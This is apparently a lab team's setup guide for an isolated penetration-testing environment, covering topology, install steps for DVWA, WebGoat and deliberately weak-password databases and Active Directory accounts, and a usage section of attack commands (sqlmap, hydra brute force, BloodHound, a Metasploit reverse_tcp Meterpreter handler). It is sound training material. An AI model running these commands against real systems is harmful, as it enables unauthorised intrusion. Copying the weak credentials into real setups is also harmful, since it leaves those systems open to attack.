# Penetration Testing Lab Environment

## Overview

**Purpose:** An isolated penetration testing laboratory for security research, vulnerability assessment, and ethical hacking practice.

**Use Cases:**
- Security vulnerability assessment training
- Penetration testing methodology practice
- Security tool evaluation and testing
- Red team/Blue team exercises
- Incident response training

## Architecture

### System Topology

```
[Isolated Network - 10.10.10.0/24]
        |
[Attacker Machine] (10.10.10.100) - Kali Linux
        |
        |----[Target Network - 10.10.20.0/24]
                |
                |----[Web Server] (10.10.20.10) - Vulnerable web apps
                |----[Database Server] (10.10.20.11) - MySQL/PostgreSQL
                |----[File Server] (10.10.20.12) - Samba/NFS
                |----[Domain Controller] (10.10.20.13) - Active Directory
                |----[Workstation 1] (10.10.20.20) - Windows 10
                |----[Workstation 2] (10.10.20.21) - Ubuntu Desktop
        |
[Monitoring/SIEM] (10.10.10.200) - Security Operations Center
```

### Components

| Component | Role | Specifications |
|-----------|------|----------------|
| Attacker Machine | Penetration testing tools | 8 cores, 16 GB RAM, 200 GB storage |
| Web Server | Vulnerable applications | 4 cores, 8 GB RAM, 100 GB storage |
| Database Server | Backend databases | 4 cores, 8 GB RAM, 100 GB storage |
| File Server | File sharing services | 2 cores, 4 GB RAM, 100 GB storage |
| Domain Controller | Active Directory | 4 cores, 8 GB RAM, 100 GB storage |
| Workstations | Client endpoints | 2 cores, 4 GB RAM, 50 GB storage each |
| Monitoring/SIEM | Security monitoring | 8 cores, 16 GB RAM, 500 GB storage |

## Requirements

### Hardware Requirements

- **Total:** 8 virtual machines
- **CPU:** Minimum 40 cores total
- **Memory:** Minimum 70 GB RAM total
- **Storage:** Minimum 1.3 TB total
- **Network:** Isolated network, no internet access for target network

### Software Requirements

- **Attacker OS:** Kali Linux 2023.3 or later
- **Target Systems:**
  - Web Server: Ubuntu 22.04 with DVWA, WebGoat, Metasploitable
  - Database: Ubuntu 22.04 with MySQL 8.0, PostgreSQL 15
  - File Server: Ubuntu 22.04 with Samba, NFS
  - Domain Controller: Windows Server 2019
  - Workstations: Windows 10, Ubuntu 22.04
- **Monitoring:** Security Onion or Wazuh
- **Required Tools:**
  - Metasploit Framework
  - Nmap
  - Burp Suite
  - Wireshark
  - John the Ripper
  - Hashcat

## Setup Instructions

### 1. Environment Preparation

```bash
# Create isolated network
# Configure virtual switch with no external connectivity
# Ensure proper network isolation for ethical testing only
```

### 2. Attacker Machine Setup (Kali Linux)

```bash
# Update Kali
sudo apt update && sudo apt upgrade -y

# Install additional tools
sudo apt install -y metasploit-framework sqlmap nikto gobuster \
    hydra john bloodhound crackmapexec enum4linux impacket-scripts

# Initialize Metasploit database
sudo msfdb init

# Start PostgreSQL
sudo systemctl start postgresql
sudo systemctl enable postgresql
```

### 3. Web Server Setup (Vulnerable Apps)

```bash
# Install LAMP stack
sudo apt install -y apache2 mysql-server php libapache2-mod-php php-mysql

# Install DVWA (Damn Vulnerable Web Application)
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA/
sudo chmod -R 755 DVWA/

# Configure DVWA database
sudo mysql -e "CREATE DATABASE dvwa;"
sudo mysql -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';"
sudo mysql -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"

# Install WebGoat
sudo apt install -y default-jdk
cd /opt
sudo wget https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar
```

### 4. Database Server Setup

```bash
# Install MySQL and PostgreSQL
sudo apt install -y mysql-server postgresql

# Configure MySQL for remote access
sudo sed -i 's/bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf

# Create test databases
sudo mysql -e "CREATE DATABASE testdb;"
sudo mysql -e "CREATE USER 'testuser'@'%' IDENTIFIED BY 'weakpassword';"
sudo mysql -e "GRANT ALL PRIVILEGES ON testdb.* TO 'testuser'@'%';"

# Configure PostgreSQL
sudo -u postgres psql -c "CREATE DATABASE testdb;"
sudo -u postgres psql -c "CREATE USER testuser WITH PASSWORD 'weakpassword';"
```

### 5. Active Directory Setup (Windows Server)

```powershell
# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest -DomainName "testlab.local" `
    -DomainNetbiosName "TESTLAB" `
    -InstallDns `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)

# Create test users
New-ADUser -Name "John Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@testlab.local" `
    -AccountPassword (ConvertTo-SecureString "Summer2023!" -AsPlainText -Force) -Enabled $true

New-ADUser -Name "Admin User" -SamAccountName "admin" -UserPrincipalName "admin@testlab.local" `
    -AccountPassword (ConvertTo-SecureString "Admin123!" -AsPlainText -Force) -Enabled $true

# Add to administrators
Add-ADGroupMember -Identity "Domain Admins" -Members "admin"
```

### 6. Monitoring Setup (Security Onion/Wazuh)

```bash
# Install Security Onion
# Download from https://github.com/Security-Onion-Solutions/securityonion

# Or install Wazuh
curl -sO https://packages.wazuh.com/4.5/wazuh-install.sh
sudo bash wazuh-install.sh -a

# Configure agents on target systems
```

## Validation

### Test Procedures

1. **Test Network Connectivity:**
   ```bash
   # From attacker machine
   nmap -sn 10.10.20.0/24
   ```
   Expected output: All target hosts discovered

2. **Test Web Application Access:**
   ```bash
   # From attacker machine
   curl http://10.10.20.10/DVWA/
   firefox http://10.10.20.10/DVWA/
   ```
   Expected output: DVWA login page accessible

3. **Test Database Connectivity:**
   ```bash
   # From attacker machine
   nmap -p 3306,5432 10.10.20.11
   mysql -h 10.10.20.11 -u testuser -pweakpassword
   ```
   Expected output: Successful connection to databases

4. **Test Domain Access:**
   ```bash
   # From attacker machine
   enum4linux -a 10.10.20.13
   crackmapexec smb 10.10.20.13 -u guest -p ''
   ```
   Expected output: Domain information enumerated

5. **Test Monitoring:**
   ```bash
   # Generate test traffic and verify SIEM captures
   # Access SIEM dashboard and verify alerts
   ```
   Expected output: Security events logged

## Usage

### Common Operations

```bash
# Network reconnaissance
nmap -sV -sC -oA scan_results 10.10.20.0/24

# Vulnerability scanning
nmap --script vuln 10.10.20.10
nikto -h http://10.10.20.10

# Web application testing
sqlmap -u "http://10.10.20.10/vulnerable.php?id=1" --dbs
burpsuite &

# Password attacks
hydra -L users.txt -P passwords.txt 10.10.20.10 ssh
john --wordlist=rockyou.txt hashes.txt

# Active Directory enumeration
bloodhound-python -u jdoe -p 'Summer2023!' -d testlab.local -ns 10.10.20.13 -c all

# Exploitation with Metasploit
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.100
exploit
```

### Monitoring

```bash
# Monitor network traffic
sudo tcpdump -i eth0 -w capture.pcap

# Wireshark analysis
wireshark capture.pcap

# Check SIEM alerts
# Access web interface at https://10.10.10.200
```

## Troubleshooting

### Issue 1: Cannot reach target network

**Symptom:** No connectivity to 10.10.20.0/24 from attacker machine

**Solution:**
- Verify virtual network configuration
- Check routing table: `ip route`
- Ensure firewall rules allow traffic
- Verify target systems are powered on

### Issue 2: Vulnerable applications not accessible

**Symptom:** HTTP 404 or connection refused errors

**Solution:**
- Check web server status: `systemctl status apache2`
- Verify application files: `ls -la /var/www/html/`
- Check Apache logs: `tail -f /var/log/apache2/error.log`
- Verify firewall allows port 80/443

### Issue 3: Database connections failing

**Symptom:** Cannot connect to MySQL or PostgreSQL

**Solution:**
- Verify service status: `systemctl status mysql postgresql`
- Check listening ports: `netstat -tlnp | grep -E "3306|5432"`
- Review configuration: `/etc/mysql/mysql.conf.d/mysqld.cnf`
- Check user permissions in database

### Issue 4: Active Directory authentication issues

**Symptom:** Cannot authenticate to domain

**Solution:**
- Verify DC is running and DNS is configured
- Check time synchronization between systems
- Test with: `rpcclient -U jdoe 10.10.20.13`
- Review event logs on Domain Controller

## Maintenance

### Regular Tasks

- **After each session:** Restore snapshots of target systems to clean state
- **Weekly:** Update Kali Linux tools and exploits
- **Monthly:** Review and update vulnerable applications
- **Quarterly:** Add new target systems and scenarios

### Backup and Recovery

```bash
# Create VM snapshots before each lab session
# Hypervisor snapshot commands

# Backup important data
sudo tar -czf /backup/lab-config-$(date +%Y%m%d).tar.gz \
    /home/kali/tools/ \
    /opt/scripts/

# Restore to clean state
# Revert to snapshot through hypervisor
```

## Security and Legal Considerations

⚠️ **IMPORTANT WARNING:**

- This lab is for EDUCATIONAL PURPOSES ONLY
- Never use these techniques on systems you don't own or have explicit permission to test
- Keep the lab network completely isolated from production networks
- Do not connect the target network to the internet
- Maintain proper documentation of all testing activities
- Follow responsible disclosure practices if vulnerabilities are discovered

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115 - Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

## Version History

| Version | Date | Changes | Author |
|---------|------|---------|--------|
| 1.0 | 2025-11-12 | Initial version | Systems Lab Team |
